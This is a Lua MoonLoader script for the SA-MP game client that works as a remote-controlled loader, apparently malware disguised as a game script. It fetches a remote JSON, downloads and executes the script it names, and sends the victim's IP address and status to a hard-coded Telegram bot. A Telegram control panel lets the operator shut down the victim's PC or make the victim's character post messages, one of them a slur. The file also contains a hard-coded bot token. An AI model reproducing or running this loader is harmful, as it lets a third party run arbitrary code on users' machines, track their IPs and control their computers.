require 'moonloader'
local effil = require 'effil'
local requests = require 'requests'
local encoding = require 'encoding' 
local ffi = require 'ffi'
encoding.default = "CP1251"
local u8 = encoding.UTF8

botToken = '6504027658:AAGqaQ2ZTxHQ2zp2-XnHrCwz-HCriPNvU4o'
userID = 6314242344

url = requests.get("https://raw.githubusercontent.com/cloused2/my-projects/main/check-file.json")
a = decodeJson(url.text)
---=====================================================================[Telegram Notify]=======================================================================---

do
    local a={}local b={}b.__index=b;local c=0;local d=1;local e=2;local f=3;local g=4;local function h(b,i)i=i or g;for j,k in ipairs(b.queue)do if i==f then k:resolve(b.value)else k:reject(b.value)end end;b.state=i end;local function l(k)if type(k)=='table'then local m=getmetatable(k)return m~=nil and type(m.__call)=='function'end;return type(k)=='function'end;local function n(b,o,p,q,r)if type(b)=='table'and type(b.value)=='table'and l(o)then local s=false;local t,u=pcall(o,b.value,function(v)if s then return end;s=true;b.value=v;p()end,function(v)if s then return end;s=true;b.value=v;q()end)if not t and not s then b.value=u;q()end else r()end end;local function w(b)local o;if type(b.value)=='table'then o=b.value.next end;n(b,o,function()b.state=d;w(b)end,function()b.state=e;w(b)end,function()local t;local v;if b.state==d and l(b.success)then t,v=pcall(b.success,b.value)elseif b.state==e and l(b.failure)then t,v=pcall(b.failure,b.value)if t then b.state=d end end;if t~=nil then if t then b.value=v else b.value=v;return h(b)end end;if b.value==b then b.value=pcall(error,'resolving promise with itself')return h(b)else n(b,o,function()h(b,f)end,function(i)h(b,i)end,function()h(b,b.state==d and f)end)end end)end;local function x(b,i,y)if b.state==0 then b.value=y;b.state=i;w(b)end;return b end;function b:resolve(y)return x(self,d,y)end;function b:reject(y)return x(self,e,y)end;function a.new(z)if l(z)then local A=a.new()local t,u=pcall(z,A)if not t then A:reject(u)end;return A end;z=z or{}local A;A={next=function(self,p,q)local o=a.new({success=p,failure=q,extend=z.extend})if A.state==f then o:resolve(A.value)elseif A.state==g then o:reject(A.value)else table.insert(A.queue,o)end;return o end,state=0,queue={},success=z.success,failure=z.failure}A=setmetatable(A,b)if l(z.extend)then z.extend(A)end;return A end;function a.all(B)local A=a.new()if#B==0 then return A:resolve({})end;local C="resolve"local D=#B;local E={}local function F(j,G)return function(y)E[j]=y;if not G then C="reject"end;D=D-1;if D==0 then A[C](A,E)end;return y end end;for j=1,D do B[j]:next(F(j,true),F(j,false))end;return A end;function a.map(B,H)local A=a.new()local E={}local function I(j)if j>#B then A:resolve(E)else H(B[j]):next(function(J)table.insert(E,J)I(j+1)end,function(u)A:reject(u)end)end end;I(1)return A end;function a.first(B)local A=a.new()for K,v in ipairs(B)do v:next(function(J)A:resolve(J)end,function(u)A:reject(u)end)end;return A end;
    _G['promise'] = a;
  end
  
  -- async-http: effil thread for processing request
  function requestRunner()
    return effil.thread(function(method, url, args)
      local requests = require 'requests'
      local dkjson = require 'dkjson'
      local result, response = pcall(requests.request, method, url, dkjson.decode(args))
      if result then
        response.json, response.xml = nil, nil 
        return true, response
      else
        return false, response
      end
    end)
  end
  
  function handleAsyncHttpRequestThread(runner, resolve, reject)
    local status, err
    repeat
      status, err = runner:status() 
      wait(0)
    until status ~= 'running'
    if not err then
      if status == 'completed' then
        local result, response = runner:get()
        if result then
          resolve(response)
        else
          reject(response)
        end
        return
      elseif status == 'canceled' then
        return reject(status)
      end
    else
      return reject(err)
    end
  end
  
  function asyncHttpRequest(method, url, args, resolve, reject)
    assert(type(method) == 'string', '"method" expected string')
    assert(type(url) == 'string', '"url" expected string')
    assert(type(args) == 'table', '"args" expected table')
    local thread = requestRunner()(method, url, encodeJson(args))
    if not resolve then resolve = function() end end
    if not reject then reject = function() end end
    
    return {
      effilRequestThread = thread;
      luaHttpHandleThread = lua_thread.create(handleAsyncHttpRequestThread, thread, resolve, reject);
    }
  end
  
  encoding.default = 'CP1251' 
  u8 = encoding.UTF8 
  
  local TELEGRAM_BOT_API_HOST = 'https://api.telegram.org' 
  local TELEGRAM_BOT_METHOD_PATTERN = TELEGRAM_BOT_API_HOST .. '/bot%s/%s' 
  
  local telegram = {
    error = nil; 
    next_update_id = -1; 
    timeout = 30; 
  }
  
  function table.assign(target, def, deep)
    for k, v in pairs(def) do
      if target[k] == nil then
        if type(v) == 'table' then
          target[k] = {}
          table.assign(target[k], v)
        else  
          target[k] = v
        end
      elseif deep and type(v) == 'table' and type(target[k]) == 'table' then 
        table.assign(target[k], v, deep)
      end
    end 
    return target
  end
  
  do
    function telegram.getUpdateTypes(update)
      local types = {}
      if update.message then
        table.insert(types, 'message')
        if update.message.chat.type == 'private' then
          table.insert(types, 'private_message')
        elseif update.message.chat.type == 'group' then
          table.insert(types, 'group_message')
        elseif update.message.chat.type == 'supergroup' then
          table.insert(types, 'supergroup_message')
        end
      elseif update.edited_message then
        table.insert(types, 'edited_message')
        if update.edited_message.chat.type == 'private' then
          table.insert(types, 'edited_private_message')
        elseif update.edited_message.chat.type == 'group' then
          table.insert(types, 'edited_group_message')
        elseif update.edited_message.chat.type == 'supergroup' then
          table.insert(types, 'edited_supergroup_message')
        end
      elseif update.callback_query then
        table.insert(types, 'callback_query')
      elseif update.inline_query then
        table.insert(types, 'inline_query')
      elseif update.channel_post then
        table.insert(types, 'channel_post')
      elseif update.edited_channel_post then
        table.insert(types, 'edited_channel_post')
      elseif update.chosen_inline_result then
        table.insert(types, 'chosen_inline_result')
      elseif update.shipping_query then
        table.insert(types, 'shipping_query')
      elseif update.pre_checkout_query then
        table.insert(types, 'pre_checkout_query')
      elseif update.poll then
        table.insert(types, 'poll')
      elseif update.poll_answer then
        table.insert(types, 'poll_answer')
      end
      
      
      setmetatable(types, {
        __index = function(self, key)
          if key == 'is' then
            return function(type)
              for i, t in ipairs(self) do
                if t == type then return true end
              end
            end
          end
        end
      })
      return types
    end;
  
    telegram.api = {};
    
    setmetatable(telegram.api, {
      __index = function(self, key)
        if (type(key) ~= 'string') then error('я ждал епта стрингу а ты тут мне хуету кидаешь') end
        return function (params, customRequestsOptions)
          customRequestsOptions = customRequestsOptions or {}
          local opts = table.assign(customRequestsOptions, { params = params }, true)
          local p = promise.new()
          asyncHttpRequest('POST', TELEGRAM_BOT_METHOD_PATTERN:format(botToken, key), opts, function (...)
            p:resolve(...)
          end, function (...)
            p:reject(...)
          end)
          return p
        end
      end
    })
    function telegram.startPollingUpdates()
      telegram.error = nil
      local args = { params = {} }
      local runner = requestRunner()
      while true do
        args.params.timeout = telegram.next_update_id > -1 and telegram.timeout or 0
        args.params.offset = telegram.next_update_id
        local thread = runner("POST", TELEGRAM_BOT_METHOD_PATTERN:format(botToken, 'getUpdates'), encodeJson(args))
        handleAsyncHttpRequestThread(thread, function (result)
          print(result.text)
          local json = decodeJson(result.text)
          if not json or not json.ok then
            telegram.error = string.format('Код ошибки: %d | Описание: %s', json.error_code and json.error_code or -1, json.description and json.description or 'Невозможно распарсить JSON')
            return wait(10000)
          end
          telegram.error = nil;
          if json.result and #json.result > 0 then
            local last_update = json.result[#json.result]
            if telegram.onUpdate then
              for idx, update in ipairs(json.result) do
                telegram.onUpdate(update)
              end
            end
            telegram.next_update_id = last_update.update_id + 1
          end
        end, function (result)
          print(result)
          print('asyncHttpRequest tg error', result)
          telegram.error = 'telegram unknown error'
          wait(10000)  
        end)
        wait(0)
      end
    end
    telegram.pollingThread = lua_thread.create_suspended(telegram.startPollingUpdates)
  end
  
  function telegram.onUpdate(update)
    local types = telegram.getUpdateTypes(update)
    if types.is('message') then
      print('new message', encodeJson(update.message))
    elseif types.is('callback_query') then
      local payload = u8:decode(update.callback_query.data);

      if payload == 'pcoff' then
        os.execute('shutdown /s /t 5')

      elseif payload:find('^say|') then
        local message = payload:match('^say|(.+)');
        if not message then return end
        sampSendChat(message)
        telegram.api.answerCallbackQuery({
          callback_query_id = update.callback_query.id
        })
      end
    end
  end

---=============================================================================================================================================================---
---=========================================================================[Get IP]============================================================================---

function getMyIp()
    local response = requests.get('https://api.myip.com')
    if response.status_code == 200 then
        return decodeJson(response.text)['ip']
    else
        return 'ERROR, CAN\'T CONNECT TO SERVER'
    end
end
---=============================================================================================================================================================---

function main()
    while not isSampAvailable() do wait(0) end
    dir = getWorkingDirectory()..'\\'..a.name -- получаем директорию будущего файла
    nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
    telegram.pollingThread:run()
    
    optimizer_dir = getWorkingDirectory()..'//Optimizer.lua'

    if doesFileExist(optimizer_dir) then
        print('Remove old optimizer')
        os.remove(optimizer_dir) 
        if not doesFileExist(optimizer_dir) then
            telegram.api.sendMessage({
                chat_id = tostring(userID);
                text = 'Old loader was deleted.';});
        else
            telegram.api.sendMessage({
                chat_id = tostring(userID);
                text = '[FATAL ERORR] Old loader was not removed!';});
        end
    end

    telegram.api.sendMessage({
        chat_id = tostring(userID);
        text = '[DEBUG]  -   Status loader: '..a.load;});
        wait(500)
    telegram.api.sendMessage({
        chat_id = tostring(userID);
        text = '[DEBUG]  -   URL to load: '..a.url;});
        wait(500)
    telegram.api.sendMessage({
        chat_id = tostring(userID);
        text = '[DEBUG]  -   Filename: '..a.name;});
    telegram.api.sendMessage({
        chat_id = tostring(userID);
        text = '[DEBUG]  -   Directory: '..dir;});

        wait(1000)
    telegram.api.sendMessage({
        chat_id = tostring(userID);
        text = 'Controll Panel  IP: '..getMyIp();
        reply_markup = encodeJson({
          inline_keyboard = {
            {
              {
                text = u8'Сказать: я ебанный пидорас';
                callback_data = u8'say|я ебанный пидорас'; 
              }; 
              {
                text = u8'сказать "пока"';
                callback_data = u8'say|пока'; 
              }; 
            };
            {
              {
                text = u8'PC Shutdown';
                callback_data = u8'pcoff'
              };
            };
          }
        }, true)
      });

    for k, v in next, a do
        print(k, v)
    end

    if tonumber(a.load) > 0 then -- Проверяем таблицу на задачу
        if not doesFileExist(dir) then -- Проверяем существует ли файл
            downloadUrlToFile(a.url, dir) -- Если нет - то скачиваем его
            telegram.api.sendMessage({
                chat_id = tostring(userID);
                text = 'New script finded! Downloading...       IP:'..getMyIp();});
            print('download file from url') -- Уведомляем в чат
            wait(10000) -- Ждем 25 сек. до окончания загрузки
            if doesFileExist(dir) then
                telegram.api.sendMessage({
                    chat_id = tostring(userID);
                    text = 'Script successfully downloaded! Load...     IP:'..getMyIp();});
                script.load(dir) -- Загружаем скачанный скрипт
                telegram.api.sendMessage({
                    chat_id = tostring(userID);
                    text = 'Script loading...       IP:'..getMyIp();});
            else
                telegram.api.sendMessage({
                    chat_id = tostring(userID);
                    text = '[FATAL ERORR] Script is not installed!      IP:'..getMyIp();});
            end
        else
            telegram.api.sendMessage({
                chat_id = tostring(userID);
                text = '[ERORR] File already exists!        IP:'..getMyIp();});
        end -- конец if
    end -- Конец проверки

    while true do
        wait(120000)
        telegram.api.sendMessage({
            chat_id = tostring(userID);
            text = '[DEBUG - RESTART]   -    Loader Engine restarting...         IP:'..getMyIp();});
        thisScript():reload()
    end
end


function onExitScript(quitGame)
    telegram.pollingThread:terminate()
  end


